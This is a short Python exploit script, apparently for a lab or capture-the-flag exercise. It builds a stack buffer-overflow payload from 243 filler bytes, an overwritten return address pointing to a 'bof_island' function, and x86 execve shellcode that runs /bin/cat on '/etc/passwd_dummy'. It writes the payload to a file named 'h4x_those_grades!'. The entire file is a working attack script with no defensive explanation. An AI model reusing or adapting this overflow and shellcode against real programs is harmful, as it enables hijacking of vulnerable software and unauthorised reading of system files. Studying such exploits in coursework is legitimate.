#!/usr/bin/python3

# Exploit script to write payload into 'h4x_those_grades!' file

import sys

# Buffer fill to reach EIP
buffer_fill = b"A" * 243

# Address of 'bof_island' function in little-endian format
bof_island_address = b"\x86\x92\x04\x08"

# Shellcode to open '/etc/passwd_dummy' file
shellcode = (
    b"\x31\xc0"         # xor eax, eax
    b"\x50"             # push eax
    b"\x68\x2f\x63\x61\x74"     # push '/cat'
    b"\x68\x2f\x62\x69\x6e"     # push '/bin'
    b"\x89\xe3"         # mov ebx, esp
    b"\x50"             # push eax
    b"\x68\x79\x00\x00\x00"     # push 'y\0\0\0'
    b"\x68\x64\x75\x6d\x6d"     # push 'dumm'
    b"\x68\x73\x77\x64\x5f"     # push 'swd_'
    b"\x68\x2f\x70\x61\x73"     # push '/pas'
    b"\x68\x2f\x65\x74\x63"     # push '/etc'
    b"\x89\xe1"         # mov ecx, esp
    b"\x50"             # push eax
    b"\x51"             # push ecx
    b"\x53"             # push ebx
    b"\x89\xe1"         # mov ecx, esp
    b"\x31\xc0"         # xor eax, eax
    b"\x83\xc0\x0b"     # add eax, 11
    b"\xcd\x80"         # int 0x80
)

# Constructing the final payload
payload = buffer_fill + bof_island_address + shellcode

# Writing payload to the 'h4x_those_grades!' file
with open("h4x_those_grades!", "wb") as file:
    file.write(payload)
